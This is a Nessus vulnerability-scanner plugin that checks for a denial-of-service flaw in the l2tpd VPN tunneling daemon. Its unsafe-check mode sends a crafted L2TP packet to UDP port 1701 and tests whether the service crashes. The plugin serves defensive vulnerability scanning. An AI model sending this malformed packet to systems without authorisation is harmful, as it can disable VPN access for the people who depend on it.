#
# (C) Tenable Network Security, Inc.
#

# Ref: http://www.nessus.org/u?ceabd3b2  and
#      http://www.nessus.org/u?aabbdfb4
#
# -> No official reply to my request on the l2tpd mailing list (except
#    http://l2tpd.graffl.net/msg01241.html)
# -> The author did not bother to reply to my e-mail


include("compat.inc");

if (description)
{
 script_id(11494);
 script_version ("$Revision: 1.8 $");
 script_xref(name:"OSVDB", value:"55135");

 script_name(english:"l2tpd Malformed Data Remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a network tunneling application." );
 script_set_attribute(attribute:"description", value:
"The remote host is running l2tpd, a network tunneling application.
The installed version is vulnerable to a denial-of-service attack.

An attacker may use this flaw to disable your VPN and prevent 
partners/employees from connecting to it." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?aabbdfb4" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ceabd3b2" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"Determines the version of the remote l2tpd or crashes it");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"Denial of Service");
 script_dependencie("l2tp_detection.nasl");
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_require_ports("Services/udp/l2tp");
 exit(0);
}


if ( ! get_kb_item("Services/udp/l2tp") ) exit(0);

function ping(flag)
{
 local_var r, req, soc;

 req = raw_string(0xC8,2,0,20,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,flag);
 soc = open_sock_udp(1701);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1024);
 close(soc);
 if(r)return(1);
 else return(0);
}



function find_firmware(rep)
{
 local_var firmware, i, len;
 
 for(i=12;i<strlen(rep);i++)
 { 
  len = ord(rep[i]) * 256 + ord(rep[i+1]);
  if(ord(rep[i]) & 0x80)len -= 0x80 * 256;
  if(ord(rep[i+5]) == 6)
  {
   firmware = ord(rep[i+6]) * 256 + ord(rep[i+7]);
   return firmware;
  }
  else i += len - 1;
 }
 return NULL;
}


if(safe_checks())
{
 req =  raw_string(0xC8,2,0,20,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0);
 soc = open_sock_udp(1701);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1024);
 if(!r)exit(0);
 close(soc);
 if(("l2tpd" >< r) || ("Adtran" >< r))
 { 
 firmware = find_firmware(rep:r);
 hi = firmware / 256;
 lo = firmware % 256;
 
 if((hi == 0x06)  && (lo <= 0x90))security_warning(port:1701, proto:"udp");
 }
 exit(0);
}

# Unsafe check
if(ping(flag:0))
{
   ping(flag:3);
   if(ping(flag:0) == 0)security_warning(port:1701, proto:"udp");
}
